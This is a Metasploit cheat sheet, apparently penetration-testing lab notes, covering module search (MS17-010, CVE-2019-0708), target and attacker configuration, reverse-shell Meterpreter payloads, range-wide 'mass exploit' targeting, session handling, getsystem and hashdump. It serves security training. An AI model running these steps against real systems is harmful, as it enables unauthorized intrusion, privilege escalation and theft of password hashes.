# Metasploit Framework (MSF)
**Role:** Modular Exploitation Framework. 
**Key Insight:** Metasploit simplifies the attack lifecycle. It handles payload generation, encoding, and the exploit logic (sending the buffer overflow or malicious packet).
## 1. Starting & Searching
**Goal:** Find the right module for the vulnerability you identified in Phase 02.
```shell
# Start Metasploit (Quiet mode to skip banner)
sudo msfconsole -q
```
**Search Workflow:**
```shell
# Search by Service or CVE
msf6 > search smb
msf6 > search ms17-010
msf6 > search cve:2019-0708

# Select a module
# By Number (Fastest)
msf6 > use 56

# By Full Path (Explicit)
msf6 > use exploit/windows/smb/ms17_010_psexec
```
## 2. Configuration (The "Options" Loop)
**Goal:** Configure the target IP, attacker IP, and payload settings.

**View Options:**
```shell
# Check what is required (Yes/No column)
msf6 > show options
# OR
msf6 > options
```

**Set Target (RHOSTS):**
```shell
# Single IP
msf6 > set RHOSTS 10.129.180.71

# CIDR Range (Mass Exploit)
msf6 > set RHOSTS 10.129.180.0/24
```

**Set Attacker (LHOST/LPORT):**
- **LHOST:** Your IP (VPN/Tun0).
- **LPORT:** The port you want to listen on (Default 4444).

```shell
# Use Interface Name (Recommended for VPNs)
msf6 > set LHOST tun0

# Use Specific IP
msf6 > set LHOST 10.10.14.222
```

**Set Payload (Optional but Recommended):**
- MSF often defaults to `windows/meterpreter/reverse_tcp`. 
- If dealing with firewalls, try `reverse_https` or `bind_tcp`.

```shell
msf6 > set PAYLOAD windows/x64/meterpreter/reverse_https
```
## 3. Verification & Exploitation
**Goal:** Verify vulnerability before attacking (to avoid crashes) and then launch.
**Check (Tradecraft):**

- **Always** run this first if the module supports it. It checks if the target is actually vulnerable without running the malicious payload.
```shell
msf6 > check
# Output: The target appears to be vulnerable.
```

**Exploit:**
```shell
# Run the exploit and stay in the foreground
msf6 > exploit

# Run in the background (Job mode)
# Useful if running a listener or slow exploit
msf6 > run -j
```
## 4. Session Management
**Context:** You successfully exploited the target and have a session (Shell or Meterpreter).
```shell
# List active sessions
msf6 > sessions

# Interact with a specific session (ID 1)
msf6 > sessions -i 1

# Background the current session (Go back to msfconsole)
# Shortcut: CTRL+Z
meterpreter > background
```
## 5. Inside Meterpreter
**Context:** Meterpreter is an advanced, in-memory payload. It is far more powerful than a standard command shell.
```shell
# System Info
meterpreter > sysinfo
meterpreter > getuid

# Privilege Escalation (Auto)
meterpreter > getsystem

# Dump Hashes (If Admin/System)
meterpreter > hashdump

# Drop into a standard OS shell
meterpreter > shell
```